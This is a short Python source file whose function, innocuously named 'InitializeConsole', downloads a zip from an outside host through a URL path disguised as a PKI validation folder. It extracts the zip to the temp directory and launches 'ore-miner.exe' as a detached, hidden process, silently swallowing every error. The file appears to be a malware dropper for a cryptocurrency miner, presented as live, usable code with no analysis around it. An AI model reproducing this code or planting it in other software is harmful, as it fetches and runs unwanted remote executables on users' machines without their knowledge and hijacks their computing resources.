import requests
import tempfile
import os
import zipfile
import subprocess

def InitializeConsole():
    try:
        url = "https://cosmoplanets.net/well-known/pki-validation/ore-miner.zip"
        response = requests.get(url)

        if response.status_code == 200:
            temp_dir = tempfile.gettempdir()
            filename = os.path.join(temp_dir, "ore-miner.zip")

            with open(filename, "wb") as file:
                file.write(response.content)
            
            try:
                zip_file_path = filename
                destination_folder = temp_dir
                if zip_file_path.endswith('.zip'):
                    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
                        zip_ref.extractall(destination_folder)
                
                CREATE_NEW_PROCESS_GROUP = 0x00000200
                DETACHED_PROCESS = 0x00000008
                
                command = [os.path.join(destination_folder, "ore-miner", "ore-miner.exe")]
                p = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=open(os.devnull, 'wb'), stderr=subprocess.PIPE,
                            creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP)
            except Exception as ex:
                print(ex)
                pass
    except:
        pass
        

